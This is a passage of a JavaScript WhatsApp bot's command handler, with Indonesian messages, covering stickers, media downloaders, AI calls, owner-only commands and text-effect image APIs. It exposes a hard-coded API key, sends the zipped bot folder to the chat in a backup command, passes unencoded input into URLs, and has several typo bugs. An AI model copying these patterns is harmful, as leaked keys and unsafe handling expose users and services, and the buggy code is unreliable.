                   if (!isPremium && !isCreator && !isOwner) return reply(mess.OnlyPrem)
                   var pname = q.split('|')[0] ? q.split('|')[0] : 'water'
                   var athor = q.split('|')[1] ? q.split('|')[1] : 'mark'
                   if (isImage || isQuotedImage) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}.jpeg`)
                     var opt = { packname: pname, author: athor }
                     conn.sendImageAsSticker(from, media, msg, opt)
                     .then( res => {
                     fs.unlinkSync(media)
                     }).catch((e) => reply(mess.error.api))
                   } else if (isVideo || isQuotedVideo) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     conn.sendMessage(from, wait)
await sleep(100)
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
                     var opt = { packname: pname, author: athor }
                     conn.sendImageAsSticker(from, media, msg, opt)
                     .then( res => {
                       fs.unlinkSync(media)
                     }).catch((e) => reply(mess.error.api))
                   } else if (isQuotedSticker) {
                     if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                     conn.sendMessage(from, wait)
await sleep(100)
                     var media = quotedMsg['stickerMessage'].isAnimated !== true ? await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.jpeg`) : await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender}.webp`)
                     media = quotedMsg['stickerMessage'].isAnimated !== true ? media : (await webp2mp4File(media)).data
                     var opt = { packname: pname, author: athor }
                     quotedMsg['stickerMessage'].isAnimated !== true ?
                      conn.sendImageAsSticker(from, media, msg, opt)
                       .then( res => { fs.unlinkSync(media) }).catch((e) => reply(mess.error.api))
                       : conn.sendVideoAsSticker(from, media, msg, opt)
                        .then( res => { fs.unlinkSync(`./sticker/${sender}.webp`) }).catch((e) => reply(mess.error.api))
                   } else {
                     reply(`Kirim/Balas gambar/video/sticker dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                   }
                   break
            case prefix+'smeme': {
                if (args.length < 2) return reply(`Kirim perintah ${command} teks atas|teks bawah`)
                 conn.sendMessage(from, wait)
await sleep(200)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                var atas = q.split('|')[0] ? q.split('|')[0] : '-'
                var bawah = q.split('|')[1] ? q.split('|')[1] : '-'
                let fatGans = await TelegraPh(media)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
                let pop = await conn.sendImageAsSticker(from, smeme, msg, {
                        packname: packname,
                        author: author
                    })
                     fs.unlinkSync(pop)
                 }
                 break
            case prefix+'upload': case prefix+'tourl': case prefix+'tolink':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else if (isVideo || isQuotedVideo) {
                     var fileName = 'video'+makeid(10)+'.mp4'
                     var media = await downloadAndSaveMediaMessage(msg, 'video', `./sticker/${fileName}`)
                   } else if (isQuotedAudio) {
                     var fileName = 'audio'+makeid(10)+'.mp3'
                     var media = await downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${fileName}`)
                   } else {
                     return reply(`Kirim atau balas Sticker/Foto/Video/Audio yang ingin dijadikan url dengan caption ${command}`)
                   }
                   if (media !== null) {
                     conn.sendMessage(from, wait)
await sleep(600)
                     var data = await TelegraPh(media)
                     var teks = `*UPLOAD SUCCES*\n\n*Url :* ${util.format(data)}\n*Expired :* No expired`
                     reply(teks)
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply(mess.error.api)
                     fs.unlinkSync(media)
                   }
                   break
            case 'statustext': 
            case 'upswteks': {
               if (!isCreator) return reply(mess.OnlyOwner)
               if (!q) return reply('Teks?')
               conn.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000' })
               reply(`done`)
            }
            break
            case prefix+'backup':
                if (!isCreator) return eeply(mess.OnlyOwner)
                conn.sendMessage(from, wait)
await sleep(600)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await conn.sendMessage(from, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: msg
                })
                break
            case prefix+'emojimix': case prefix+'mixemoji':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : ${command} 😜+😅`)
                   if (!q.includes('+')) return reply(`Format salah, contoh pemakaian ${command} 😅+??`)
                   var emo1 = q.split("+")[0]
                   var emo2 = q.split("+")[1]
                   if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
                   fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
                   .then(data => {
                     sendStickerFromUrl(from, data.results[0]. url, packname, author, { quoted: msg })
                     limitAdd(sender, limit)
                   }).catch((e) => reply(mess.error.api))
                   break
             case prefix+'say':
                  if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                  if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
                  conn.sendMessage(from, wait)
await sleep(200)
                  var req = await (await fetch(`https://api.xcodeteam.xyz/api/converter/text-to-speech?api_key=${setting.apikey.xcode}&language=id-ID&text=${q}`)).json()
                  var { code } = req
                  if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                  var { audio_url } = req.data
                  conn.sendMessage(from, { audio: { url: audio_url }, mimetype: 'audio/mpeg', ptt: true }, { quoted: {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `${pushname}` } : {}) }, message: { conversation: `Text-to-speech | Indonesia` }}})
                  limitAdd(sender, limit)
                  break
             case prefix+'qc':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var teks = quotedMsg ? quotedMsg.chats : q ? q : ''
                   if (!teks) return reply(`Kirim perintah *${prefix}qc* teks`)
                     let jsonnya = {
                       type: "quoted",
                       format: "webp",
                       backgroundColor: "#FFFFFF",
                       width: 512,
                       height: 768,
                       scale: 2,
                       messages: [
                         {
                         entities: [],
                         avatar: true,
                         from: {
                           id: 1,
                           name: conn.getName(quotedMsg ? quotedMsg.sender : sender),
                           photo: {
                             url: await conn.profilePictureUrl(quotedMsg ? quotedMsg.sender : sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'),
                           }
                           },
                           text: teks,
                           replyMessage: {},
                           },
                           ],
                           }
                           const post = await axios.post("https://fake-chat.xcodeteam.xyz/generate",
                           jsonnya,{
                             headers: { "Content-Type": "application/json"},
                           })
                         let buff = await Buffer.from(post.data.result.image, "base64")
                       conn.sendImageAsSticker(from, buff, msg, { packname, author })
                   limitAdd(sender, limit)
                   break             
                case prefix+'openai1': case prefix+'ai1':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} promt`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/artificial-intelligence/chatgpt-3?api_key=${setting.apikey.xcode}&question=${q}&custom_question=Test&custom_answer=Test%20success`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   reply(req.data.answer)
                   limitAdd(sender, limit)
                   break
            case prefix+'brainly': {
                if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} question`)
                let d = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=${setting.apikey.lol}&query=${q}`)       
                await arxzy.sendMessage(from, {
                    text: d.result
                }, { quoted: msg })
            }
            break
	        // Downloader Menu
	        case prefix+'tiktokaudio':
	        case prefix+'ttaudio':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/tiktok?api_key=${apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { music } = req.data
                   conn.sendMessage(from, { audio: { url: music }, mimetype: 'audio/mp4' }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
            case prefix+'tiktokvideo':
            case prefix+'ttvideo':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/tiktok?api_key=${apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { play, description } = req.data
                   conn.sendMessage(from, { video: { url: play }, caption: description }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
            case prefix+'instagram':
            case prefix+'igreels':
            case prefix+'igphotos':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('instagram')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/instagram?api_key=${setting.apikey.xcode}&target_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   for (let i of req.data) {
                       if (i.url.includes('.jpg')) {
                         conn.sendMessage(from, { image: { url: i.url }}, { quoted: msg })
                       } else conn.sendMessage(from, { video: { url: i.url }}, { quoted: msg })
                   }
                   limitAdd(sender, limit)
                   break       
            case prefix+'ins':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   reply(mess.wait)
                   var req = await (await fetch(`https://zeltoria.site/api/tools/ssweb?url=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   for (let i of req.data) {
                       if (i.url.includes('.png')) {
                         conn.sendMessage(from, { image: { url: i.url }}, { quoted: msg })
                       } else conn.sendMessage(from, { video: { url: i.url }}, { quoted: msg })
                   }
                   limitAdd(sender, limit)
                   break
              case prefix+'play':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-play-audio?api_key=${setting.apikey.xcode}&video_title=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, {
                   	audio: {
                   	    url: url },
                       mimetype: 'audio/mp4', 
                       ptt: true,
                        contextInfo: {
                           externalAdReply: {
                               title: title,
                               body: botName,
                               thumbnailUrl: thumb,
                               mediaType: 1,
                               sourceUrl: hmm.yt,
                               renderLargerThumbnail: true
                             }
                           }
                         }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             case prefix+'ytmp4':
             case prefix+'mp4':
                   if (!isPremium && !isOwner && !isCreator) return reply(mess.OnlyPrem)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtube')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-video?api_key=${setting.apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, { image: { url: thumb }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { video: { url: url }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             case prefix+'ytmp3':
             case prefix+'mp3':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtube')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-audio?api_key=${setting.apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, { image: { url: thumb }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
            case prefix+'ytvideo':
             case prefix+'video1':
                   if (!isPremium && !isOwner && !isCreator) return reply(mess.OnlyPrem)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtu.be')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-video-v2?api_key=${setting.apikey.xcode}&video_url=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumbnail, duration, vid_360p } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Durasi :* ${duration}`
                   conn.sendMessage(from, { image: { url: thumbnail }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { video: { url: vid_360p }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             case prefix+'ytaudio':
             case prefix+'audio1':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtu.be')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-audio?api_key=${setting.apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, { image: { url: thumb }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
			// Owner Menu
			case prefix+'exif':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
			    if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
			    var namaPack = q.split('|')[0] ? q.split('|')[0] : q
                var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
                exif.create(namaPack, authorPack)
				reply(`Sukses membuat exif`)
				break
			case prefix+'leave':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
				if (!isGroup) return reply(mess.OnlyGrup)
				conn.groupLeave(from)
			    break
			case prefix+'join':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
				if (args.length < 2) return reply(`Kirim perintah ${command} _linkgrup_`)
				if (!isUrl(args[1])) return reply(mess.error.Iv)
				var url = args[1]
			    url = url.split('https://chat.whatsapp.com/')[1]
				var data = await conn.groupAcceptInvite(url)
				reply(jsonformat(data))
				break
		    case prefix+'setnamabot': case prefix+'setnamebot': {
			     if (!isCreator) return reply(`_Khusus Creator_`)
                 if (args.length < 2) return reply(`Kirim perintah ${command} _Nama akun wa_`)
                 let name = await conn.updateProfileName(q)
                 reply(`Successfully renamed bot to ${q}`)
                 }
                break
            case prefix+'bc': case prefix+'broadcast':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
		        if (args.length < 2) return reply(`Masukkan isi pesannya`)
                var data = await store.chats.all().map(v => v.id)
                for (let i of data) {
                   conn.sendMessage(i, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
                   await sleep(1000)
                }
                break
			case prefix+'mode':
                if (!isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Example ${command} public/self`)
                if (q == 'public') {
                    conn.public = true
                    conn.sendMessage(from, done)
await sleep(100)
                } else if (q == 'self') {
                    conn.public = false
                    conn.sendMessage(from, done)
await sleep(100)
                }
                break
			case prefix+'addprem':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}addprem* @tag waktu\n*${prefix}addprem* nomor waktu\n\nContoh : ${command} @tag 30d`)
                if (!args[2]) return reply(`Mau yang berapa hari?`)
                if (mentioned.length !== 0) {
                    _prem.addPremiumUser(mentioned[0], args[2], premium)
                    reply('Sukses')
                } else {
                 var cekap = await conn.onWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    _prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
                    reply('Sukses')
                }
                break
            case prefix+'delprem':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
                if (mentioned.length !== 0){
                    premium.splice(_prem.getPremiumPosition(mentioned[0], premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Sukses!')
                } else {
                 var cekpr = await conn.oWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Sukses!')
                }
                break
			// Random Menu
                case prefix+'quote': case prefix+'quotes':
                case prefix+'randomquote': case prefix+'randomquotes':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var data = JSON.parse(fs.readFileSync('./database/quotes.json'))
                   data = pickRandom(data)
                   reply(data.quotes+'\n\n-- '+data.author)
                   limitAdd(sender, limit)
                   break
                case prefix+'fakta': case prefix+'randomfakta':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var data = fs.readFileSync('./database/fakta.txt', 'utf-8').split('\n')
                   reply(pickRandom(data))
                   limitAdd(sender, limit)
                   break
                case prefix+'quoteanime': case prefix+'quotesanime':
                case prefix+'animequotes': case prefix+'animequote':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   require('../lib/quoteanime').quoteAnime().then( res => {
                     var data = pickRandom(res)
                     var teks = `${data.quote}\n\n- ${data.char_name}\nin *${data.anime_title}* eps *${data.at_ep}*`
                     reply(teks)
                     limitAdd(sender, limit)
                   }).catch((e) => reply(mess.error.api))
                   break
                case prefix+'waifu':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
                   conn.sendMessage(from, { caption: "Random Waifu", image: { url: data }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             // nsfw menu
             case prefix+'neko':
                if (!isUser) return reply(mess.OnlyPM)
                reply(`Dosa ditanggung oleh pengguna\nAgree`)
                conn.sendMessage(from, {
                    image: {
                        url: `https://zeltoria.site/api/random/neko`
                    }
                }, {
                    quoted: msg
                })
                break
            case prefix+'remini':
            case prefix+'hd':
            case prefix+'tohd':
                 conn.sendMessage(from, wait)
await sleep(100)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                var hade = await TelegraPh(media)
                var anim = `https://skizo.tech/api/remini?url=${hade}&apikey=${vanzkey}`
                conn.sendMessage(from, {
                    image: {
                        url: anim
                    }
                }, {
                    quoted: msg
                })
                break
            case prefix+'removebg':
            case prefix+'nobg':
                 conn.sendMessage(from, wait)
await sleep(100)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                var bege = await TelegraPh(media)
                var req = await fetchJson(`https://aemt.me/removebg?url=${bege}`)              
                conn.sendMessage(from, {
                    image: {
                        url: req.url.result
                    }
                }, {
                    quoted: msg
                })
                break
            case prefix+'jadianime':
            case prefix+'toanime':
                 conn.sendMessage(from, wait)
await sleep(100)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                let wtf = await TelegraPh(media)
                var anim = `https://api.caliph.biz.id/api/animeai?img=${wtf}&apikey=${apikey.caliph}`
                conn.sendMessage(from, {
                    image: {
                        url: anim
                    }
                }, {
                    quoted: msg
                })
                break
            // PhotoOxy Menu
            case prefix+'flaming':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/realistic-flaming-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'night':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/write-stars-text-on-the-night-sky?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'shadow':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/shadow-text-effect-in-the-sky?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'paper':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/write-text-on-burn-paper?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'grass':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/make-quotes-under-grass?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'cube':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/3d-text-effect-under-white-cube?api_key=${setting.apikey.xcode}text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'glow':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/make-smoky-neon-glow-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'rainbow':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/rainbow-shine-text?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'fabric':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/army-camouflage-fabric-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'glowing':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/create-a-3d-glowing-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'honey':
